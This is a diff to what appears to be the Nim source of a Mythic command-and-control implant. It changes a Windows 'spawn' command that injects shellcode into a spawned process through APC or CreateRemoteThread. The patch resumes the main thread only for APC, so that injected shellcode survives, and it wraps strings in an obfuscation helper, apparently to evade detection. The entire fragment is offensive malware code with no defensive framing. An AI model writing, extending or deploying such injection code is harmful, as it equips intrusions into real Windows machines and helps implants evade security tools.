@@ -142,7 +142,12 @@ when defined(windows):
       CloseHandle(pi.hThread)
       return (false, obf("Unknown injection technique: ") & technique)
     
-    discard ResumeThread(pi.hThread)
+    # Only resume the main thread for APC injection (APC fires on resume).
+    # For CreateRemoteThread, the shellcode already runs on its own thread;
+    # resuming the main thread lets the spawnto process execute and potentially
+    # exit, which would kill the shellcode thread.
+    if technique.toLower() == obf("apc"):
+      discard ResumeThread(pi.hThread)
     CloseHandle(pi.hProcess)
     CloseHandle(pi.hThread)
     return (true, "")
@@ -174,6 +179,8 @@ proc spawn*(taskId: string, params: JsonNode): JsonNode =
       return mythicError(taskId, obf("Spawn error: ") & e.msg)
   else:
     return mythicError(taskId, obf("spawn command is only available on Windows"))
+
+proc executeSpawn*(taskId: string, shellcode: seq[byte], params: JsonNode): JsonNode
 
 proc processSpawnChunk*(taskId: string, params: JsonNode, chunkData: string,
                         totalChunks: int, currentChunk: int,
